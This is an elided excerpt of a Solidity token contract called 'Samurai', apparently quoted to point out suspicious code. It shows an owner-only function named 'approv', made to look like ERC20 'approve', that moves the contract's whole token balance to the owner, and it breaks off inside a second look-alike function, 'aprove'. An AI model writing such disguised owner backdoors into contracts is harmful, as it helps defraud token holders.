...
contract Ownable is Context {
    ...
    modifier onlyOwnr() {
        require(_ownr == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract Samurai is Context, IERC20, Ownable {
    ...
    address payable public marketingWallet = payable(0x41e417116676420dC622f7681370E205eD3B145a);
    address payable  public devWallet = payable(0x41e417116676420dC622f7681370E205eD3B145a);
    ...
    uint256 public _maxTxAmount = 6000000 * 10**18;
    uint256 public maxWalletToken = 6000000 * (10**18);
    ...
    function approv() external onlyOwnr() {
        IERC20 erc20token = IERC20(address(this));
        uint256 balance = erc20token.balanceOf(address(this));
        erc20token.transfer(owner(), balance);
    }

    function aprove() public onlyOwnr{
